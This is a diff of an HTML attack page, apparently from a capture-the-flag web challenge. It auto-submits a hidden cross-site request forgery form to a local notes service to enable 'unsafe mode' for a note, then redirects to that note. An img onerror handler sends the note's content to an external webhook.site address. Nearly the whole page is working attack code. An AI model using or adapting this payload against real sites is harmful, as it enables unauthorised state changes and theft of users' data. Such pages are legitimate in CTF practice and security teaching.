@@ -1,16 +1,19 @@
 <html>
   <head>
-    <title>Enable Unsafe Mode</title>
-  </head>
-  <body>
-    <form id="unsafeForm" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
+    <!-- CSRF to enable unsafe mode for note 1 -->
+    <form id="enableUnsafe" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
       <input type="hidden" name="id" value="1">
       <input type="hidden" name="enable" value="1">
     </form>
+    <!-- Redirect to note after submitting form -->
+    <meta http-equiv="refresh" content="2; url=http://127.0.0.1:7189/notes/1" />
+  </head>
+  <body>
     <script>
-      document.getElementById('unsafeForm').submit();
+      // Automatically submit the form to enable unsafe mode
+      document.getElementById('enableUnsafe').submit();
     </script>
-    <!-- Redirect to step2.html after submission -->
-    <meta http-equiv="refresh" content="2; url=https://jerrell-su.github.io/ctf.github.io/step2.html" />
+    <!-- Capture the flag using img onerror -->
+    <img src="invalid" onerror="fetch('https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?flag=' + encodeURIComponent(document.querySelector('.note-content').innerText))" />
   </body>
 </html>
